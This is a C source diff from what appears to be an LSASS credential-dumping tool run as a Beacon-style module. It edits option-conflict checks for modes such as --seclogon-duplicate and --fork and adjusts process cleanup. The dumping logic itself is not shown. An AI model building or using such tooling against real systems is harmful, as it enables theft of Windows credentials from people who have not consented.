@@ -234,7 +234,7 @@ void go(char* args, int length)
     ret_val = TRUE;
 
 cleanup:
-    if (forked_lsass || use_seclogon_duplicate)
+    if (hProcess && forked_lsass)
         kill_process(0, hProcess);
     if (hProcess)
         NtClose(hProcess);
@@ -585,16 +585,10 @@ int main(int argc, char* argv[])
         return 0;
     }
 
-    if (fork_lsass && use_seclogon_duplicate)
-    {
-        PRINT("The options --fork and --seclogon-duplicate cannot be used together");
-        return 0;
-    }
-
     if (duplicate_handle && spoof_callstack)
     {
-        return 0;
         PRINT("The options --duplicate and --spoof-callstack cannot be used together");
+        return 0;
     }
 
     if (duplicate_handle && use_seclogon_duplicate)
@@ -663,12 +657,6 @@ int main(int argc, char* argv[])
         return 0;
     }
 
-    if (use_seclogon_duplicate && snapshot_lsass)
-    {
-        PRINT("The options --seclogon-duplicate and --snapshot cannot be used together");
-        return 0;
-    }
-
     if (use_seclogon_duplicate && spoof_callstack)
     {
         PRINT("The options --seclogon-duplicate and --spoof-callstack cannot be used together");
@@ -678,12 +666,6 @@ int main(int argc, char* argv[])
     if (!use_lsass_shtinkering && use_seclogon_leak_local && !is_full_path(dump_path))
     {
         PRINT("If --seclogon-leak-local is being used, you need to provide the full path: %s", dump_path);
-        return 0;
-    }
-
-    if (use_lsass_shtinkering && use_seclogon_duplicate)
-    {
-        PRINT("The options --shtinkering and --seclogon-duplicate cannot be used together");
         return 0;
     }
 
@@ -842,7 +824,7 @@ int main(int argc, char* argv[])
     ret_val = TRUE;
 
 cleanup:
-    if (hProcess && (fork_lsass || use_seclogon_duplicate))
+    if (hProcess && fork_lsass)
         kill_process(0, hProcess);
     if (hProcess)
         NtClose(hProcess);
